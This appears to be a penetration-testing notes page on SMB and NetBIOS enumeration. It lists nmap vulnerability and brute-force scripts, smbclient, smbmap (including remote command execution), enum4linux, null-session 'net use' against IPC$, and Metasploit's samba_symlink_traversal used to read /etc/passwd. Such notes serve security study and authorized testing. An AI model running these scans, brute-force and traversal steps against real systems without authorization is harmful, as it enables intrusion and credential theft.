# SMB

## Enumeration

```
nmap -sT –sU -sV 192.168.13.26 -p135,137,138,139,445 --open
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1
nmap -p139,445 --script smb-os-discovery [target]
nmap -p137,139,445 --script smb-security-mode [target]
nmap -sU -p137 --script smb-security-mode [target]
nmap -p445 --script smb-vuln-ms08-067 [target]
nmap -p445 --script smb-vuln-* [target]
nmap -v -p139,445 --script smb-enum-users [target]
nmap -sU -p137 --script smb-enum-users --script-args samronly=true [target]
nmap -sU -p137 --script smb-enum-users --script-args lsaonly=true [target]
nmap -p139,445 --script smb-enum-shares --script-args smbusername=Administrator,smbpassword=Password [target]
nmap -sU -p137 --script smb-enum-shares [target]
nmap -p445 --script smb-enum-sessions [target]
$ nmap -p445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt [target]
nmap -sU -p137 --script smb-enum-sessions [target]
nmap -p445 --script smb-vuln-double-pulsar-backdoor [target]

```

## Linux

Samba, a Linux-based implementation of the SMB/CIFS protocols, provides print and file sharing services for windows clients within an environment. Recent versions also seamlessly can be integrated with Active Directory domains

Samba can be found listening on the usual “NetBIOS” ports:

![](<../../../.gitbook/assets/image (41).png>)

### fix smbclient protocol negotiation failed error

you might face this error on some of the enumeration tools in kali or any other Pentesting distro so i though i should say something about this.

```
edit /etc/samba/smb.conf

Add the following under global:

client min protocol = CORE
client max protocol = SMB3
```

this is a config file for smb service on your hacking machine and might interfere with some other services remember to change the protocol version later.

### smbclient

#### list shares

```
smbclient -N -L \\\\[ip]\\
smbclient -N -L \\\\192.168.99.162\\
```

attempt to connect to smb service abd list smb files (we are after ADMIN$ usually smbclient \\\\\[ip]\\\[file] (we can open a file or put a file like ftp)

#### Access Share

```
smbclient \\\\[ip]\\[share name]
smbclient \\\\192.168.30.53\\WorkSharing
```

` ` if you see any files of interest you can type the following

```
get [filename].txt /root/Desktop/[filename].txt 
```

### smbmap

installation:

```
apt install smbmap
pip3 install --upgrade impacket → if got error authenticating upgrade impacket
```

usage:

```
smbmap -H [ip]
```

```
-H HOST IP of host
--host-file FILE File containing a list of hosts
-u USERNAME Username, if omitted null session assumed
-p PASSWORD Password or NTLM hash
-s SHARE Specify a share (default C$), ex 'C$'
-d DOMAIN Domain name (default WORKGROUP)
-P PORT SMB port (default 445)
-x COMMAND Execute a command ex. 'ipconfig /all'
-L List all drives on the specified host
--download/--upload/--delete
--skip --> skip delete confirm prompt
```

### enum4linux

```
apt-get install ldapscripts  
```

open /etc/samba/smb.conf and add these under global section \[global]

```
...
client use spnego = no
client ntlmv2 auth = no
... 
```

run:

```
enum4linux -a [ip]
enum4linux -A -v [IP address]
```

cheat sheet:

{% embed url="https://highon.coffee/blog/enum4linux-cheat-sheet/" %}

### nbtscan

```
nbtscan -v [IP Address orr address range IE /24]>
nbtscan [ip]
```

&#x20;if you then see something like     ELS-WINXP    <20>    Unique    Registered -- then there is a server or share

## Windows

### NetBIOS

NetBIOS stands for Network Basic Input Output System. Servers and clients use NetBIOS when viewing network shares on the local area network.

NetBIOS can supply some of the following information when querying a computer:

```
• Hostname
• NetBIOS name
• Domain
• Network shares
```

This block diagram represents the structure of NetBIOS

![](<../../../.gitbook/assets/image (43).png>)

As you can see the NetBIOS layer sits between the application layer and the IP layer. UDP is used to perform NetBIOS name resolution and to carry other one-to-many datagram-based communications. By using NetBIOS datagrams, a host can send small messages to many other hosts. Heavy traffic, such as a file copy, relies on TCP by using NetBIOS sessions.

When an MS Windows machine browses a network, it uses NetBIOS:

```
• Datagrams to list the shares and the machines
• Names to find workgroups
• Sessions to transmit data to and from a Windows share
```

A Windows machine can share a file or a directory on the network; this lets local and remote users access the resource and, possibly, modify it. Starting from Windows Vista, users can choose to share a single file or use the Public directory. When sharing a single file, they can choose local or remote users to share the file with. When using the Public directory, they can choose which local users can access the files on the share, but they can only allow everyone or no one in the network to access the share.

### UNC Paths

An authorized user can access shares by using Universal Naming Convention paths (UNC paths).

The format of a UNC path is:

```
\\ServerName\ShareName\file.nat
```

### Administrative Shares

There are also some special default administrative shares which are used by system administrators and Windows itself:

• \ComputerName\C$ lets an administrator access a volume on the local machine. Every volume has a share (C$, D$, E$, etc.)&#x20;

• \ComputerName\admin$ points to the windows installation directory&#x20;

• \ComputerName\ipc$ is used for inter-process communication. You cannot browse it via Windows Explorer

​​You can test volume shares and the admin$ share on your computer by entering the following on your Windows Explorer address bar

## Null Sessions

Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:

```
• Passwords
• System users
• System groups
• Running system processes
```

Null sessions are remotely exploitable; this means that attackers can use their computers to attack a vulnerable Windows machine. Moreover, this attack can be used to call remote APIs and remote procedure calls. Because of these factors, null session attacks had a huge impact on Windows ecosystems. Nowadays Windows is configured to be immune from this kind of attack. However, legacy hosts can still be vulnerable! A null session attack exploits an authentication vulnerability for Windows Administrative Shares; this lets an attacker connect to a local or remote share without authentication We will go through the enumeration of windows shares and their exploitation by using various techniques and tools.

### nbtstat

In Windows, the most common command to use when enumerating Windows shares is nbtstat. Nbtstat is a Windows command line tool that can display information about a target. You can check how to use it by passing it the /? parameter The most common use of nbtstat is "nbtstat -A \[IP]" that displays information about a target

![](<../../../.gitbook/assets/image (42).png>)

#### the first line tells us the name of the machine \[OVERLORD]  the record type 00 tells us that OVERLORD is a workstation.  the type UNIQUE tells us that this computer must have only one IP address assigned.  second line contains the workgroup or the domain the computer is joined to.  type 20 record means that the file sharing service is up and running on the machine. 

​Once an attacker knows that a machine has the File Server service running, they can enumerate the shares by using the NET VIEW command.

```
NET VIEW [target ip]
```

![](<../../../.gitbook/assets/image (39).png>)

This machine is sharing a directory; the share name is shares You can also perform shares enumeration from a Linux machine. You need to use the tools provided by the Samba suite. Samba tools are already installed in Kali Linux, but you can install them in nearly every Linux distribution. To perform the same operations of nbtstat, you can use nmblookup with the same command line switch:

```
nmblookup -A [target ip ]
```

![](<../../../.gitbook/assets/image (38).png>)

## Checking for Null Sessions

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it is time to check if a null session attack is possible To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.

```
NET USE \\[target IP address]\IPC$ '' /u:''
net use \\10.130.40.80\IPC$ '' /u:''
```

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

### metasploit modules

```
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_version
```

#### gain access to smb shares

```
use auxiliary/admin/smb/samba_symlink_traversal
set SMBSHARE tmp
exit
smbclient //192.168.99.131/tmp
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[..]
```

## Mounting Shares From Linux

```
mount.cifs /192.168.99.162/C /media/K_share/ user=,pass=
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U “” target
```
